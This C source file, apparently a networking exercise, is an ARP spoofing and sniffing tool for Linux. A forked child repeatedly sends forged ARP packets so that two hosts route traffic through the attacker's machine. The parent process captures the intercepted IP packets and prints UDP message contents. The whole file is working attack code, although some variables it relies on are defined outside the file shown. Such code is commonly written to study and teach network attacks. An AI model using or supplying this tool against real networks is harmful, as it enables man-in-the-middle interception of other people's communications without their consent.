#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include<unistd.h>
#include "arp.h"

unsigned char bcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

union eth_buffer fill_arp(unsigned char srcIP[4], unsigned char srcMAC[6],
													unsigned char dstIP[4], unsigned char dstMAC[6],
													int operation)
{
	union eth_buffer buffer_u;

	/* fill the Ethernet frame header */
	memcpy(buffer_u.cooked_data.ethernet.dst_addr, dstMAC, 6);
	memcpy(buffer_u.cooked_data.ethernet.src_addr, srcMAC, 6);
	buffer_u.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);

	/* fill payload data (incomplete ARP request example) */
	buffer_u.cooked_data.payload.arp.hw_type = htons(1);
	buffer_u.cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
	buffer_u.cooked_data.payload.arp.hlen = 6;
	buffer_u.cooked_data.payload.arp.plen = 4;
	buffer_u.cooked_data.payload.arp.operation = htons(operation);
	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, srcMAC, 6);
	//memset(buffer_u.cooked_data.payload.arp.src_paddr, 0, 6);
	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, srcIP, 4);
	//memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
	memcpy(buffer_u.cooked_data.payload.arp.tgt_hwaddr, dstMAC, 6);
	//memset(buffer_u.cooked_data.payload.arp.tgt_paddr, 0, 6);
	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, dstIP, 4);

	return buffer_u;
}

int main(int argc, char *argv[])
{
	struct ifreq if_idx, if_mac, ifopts, if_addr;
	char ifName[IFNAMSIZ];
	struct sockaddr_ll socket_address;
	int sockfd, numbytes;
	int spoofing_mode = ARP_REPLY;

	unsigned char my_ip[4];
	unsigned char my_mac[6];

	union eth_buffer buffer_u;

	/* Get interface name */
	if (argc >= 4)
	{
		strcpy(ifName, argv[1]);
		strcpy(pc1_ip_string, argv[2]);
		strcpy(pc2_ip_string, argv[3]);
		if(argc == 5)
			spoofing_mode = atoi(argv[4]);
	}
	else
	{
		printf("\nUsage: %s <network interface> <pc 1 IP> <pc 2 IP> <atack mode>\nAtack mode: 1 - ARP Request\n            2 - ARP Reply\n", argv[0]);
		exit(1);
	}

	/* Open RAW socket */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		perror("socket");

	/* Set interface to promiscuous mode */
	strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
	ifopts.ifr_flags |= IFF_PROMISC;
	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);

	/* Get the index of the interface */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
		perror("SIOCGIFINDEX");
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;

	/* Get the MAC address of the interface */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		perror("SIOCGIFHWADDR");
	memcpy(my_mac, if_mac.ifr_hwaddr.sa_data, 6);

	/* Get the IP address of the interface */
	if_addr.ifr_addr.sa_family = AF_INET;
	strncpy(if_addr.ifr_name, ifName, IFNAMSIZ-1);
	if(ioctl(sockfd, SIOCGIFADDR, &if_addr) < 0)
		perror("SIOCGIFPADDR");
	memcpy(my_ip, if_addr.ifr_addr.sa_data+2, 4);

	printf("My IP: %d.%d.%d.%d\n",my_ip[0],my_ip[1],my_ip[2],my_ip[3]);

	printf("My MAC: %x:%x%x:%x:%x:%x\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);

	/* End of configuration. Now we can send and receive data using raw sockets. */

	pid_t pid;

	pid = fork();

	if(pid < 0)
		perror("fork");

	if(pid == 0)
	{
	/* Spoofing time! */

		while(1)
		{
			/* Fill an ARP packet with the IP of PC1 to PC2 with my MAC*/
			buffer_u = fill_arp(pc1_ip, my_mac, pc2_ip, pc2_mac, spoofing_mode);

			/* Send it.. */
			printf("Sending PC2\n");
			memcpy(socket_address.sll_addr, bcast_mac, 6);
			if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Send failed\n");

			/* Fill an ARP packet with the IP of PC2 to PC1 with my MAC*/
			buffer_u = fill_arp(pc2_ip, my_mac, pc1_ip, pc1_mac, spoofing_mode);

			/* Send it.. */
			printf("Sending PC1\n");
			memcpy(socket_address.sll_addr, bcast_mac, 6);
			if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Send failed\n");

			sleep(5);
		}
	}

	else
	{
		/* Sniffing time! */

			char *p;
			while (1){
				numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
				if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP))
				{
					printf("#########################################################################################\n");
					/* Print IP packet header */
					printf(" IP packet, %d bytes - src ip: %d.%d.%d.%d - dst ip: %d.%d.%d.%d - proto: %d\n",
						numbytes,
						buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
						buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
						buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
						buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
						buffer_u.cooked_data.payload.ip.proto
					);

					if (buffer_u.cooked_data.payload.ip.proto == PROTO_UDP && buffer_u.cooked_data.payload.udp.udphdr.dst_port == ntohs(DST_PORT)){
						p = (char *)&buffer_u.cooked_data.payload.udp.udphdr + ntohs(buffer_u.cooked_data.payload.udp.udphdr.udp_len);
						*p = '\0';
						/* Print UDP packet header */
						printf(" UDP packet, %d bytes - scr port: %d - dst port: %d\n",
							ntohs(buffer_u.cooked_data.payload.udp.udphdr.udp_len),
							ntohs(buffer_u.cooked_data.payload.udp.udphdr.src_port),
							ntohs(buffer_u.cooked_data.payload.udp.udphdr.dst_port));
						/* Print UDP message */
						printf(" Message:\n %s\n", (char *)&buffer_u.cooked_data.payload.udp.udphdr + sizeof(struct udp_hdr));
						printf("#########################################################################################\n");
					}
					else
					printf("#########################################################################################\n");
					continue;
				}
		}

	}
	/* To receive data (in this case we will inspect ARP and IP packets)... */

	return 0;
}
